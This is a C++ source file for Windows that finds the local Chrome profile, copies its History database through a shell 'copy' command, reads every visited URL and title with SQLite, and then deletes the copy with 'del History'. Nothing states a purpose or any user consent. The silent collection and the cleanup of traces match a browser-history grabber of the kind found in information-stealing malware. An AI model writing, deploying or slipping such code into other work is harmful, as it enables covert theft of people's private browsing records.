#include <string>
#include <locale>
#include <windows.h>

#include "sqlite3.h"

#pragma warning(disable: 4996)

const char* data = "";
char* err = 0;
std::string ret = "";

bool direxists(const std::wstring& dirName_in) {
	DWORD ftyp = GetFileAttributesW(dirName_in.c_str());
	if (ftyp == INVALID_FILE_ATTRIBUTES)
		return false;

	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		return true;

	return false;
}

int callback_history(void* data, int argc, char** argv, char** azColName) {
	for (int i = 0; i < argc; ++i) {
		try {
			if (argv[i]) {
				ret += azColName[i];
				ret += " = ";
				ret += argv[i];
			}
			else {
				ret += azColName[i];
				ret += " = NULL";
			}
			ret += "\n";
		}
		catch (...) {
			ret += "NULL\n";
		}
	}
	ret += "\n\n";
	return 0;
}

std::string get_chrome_history(std::string database_name) {
	sqlite3* db = 0;
	const char* sql = "SELECT id, url, title FROM urls";

	if (!(sqlite3_open(database_name.c_str(), &db))) {
		sqlite3_exec(db, sql, 0, 0, &err);
		if (sqlite3_exec(db, sql, callback_history, (void*)data, &err) == SQLITE_OK)
			sqlite3_free(err);
		else return "none";
		sqlite3_close(db);
	}
	_wsystem(L"del History");
	return ret;
}

std::string GetChromeHistory() {
	std::locale system("");
	std::locale::global(system);

	// getting path to AppData
	std::wstring chrome_path = _wgetenv(L"LOCALAPPDATA");
	chrome_path += L"\\Google\\Chrome\\User Data\\Default\\";
	std::wstring history = chrome_path + L"History";

	if (!(direxists(chrome_path))) return "none";

	std::wstring command = L"copy /B \"" + history + L"\" /B History";
	_wsystem(command.c_str());
	


	return get_chrome_history("History");
}